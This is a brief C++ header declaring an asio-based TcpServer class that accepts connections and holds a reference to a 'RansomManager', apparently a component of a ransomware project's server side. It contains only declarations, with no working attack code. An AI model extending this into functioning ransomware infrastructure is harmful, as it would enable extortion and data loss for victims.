#pragma once
#include <asio.hpp>
#include <functional>
#include <iostream>

#include "TcpConnection.h"

class TcpServer
{
private:
	asio::ip::tcp::acceptor acceptor_;
	RansomManager& ransomManager_;

public:
	TcpServer(asio::io_service& io_service, RansomManager& ransomManager);

private:
	void start_accept();
	void handle_accept(TcpConnection::pointer new_connection, const asio::error_code& error);
};

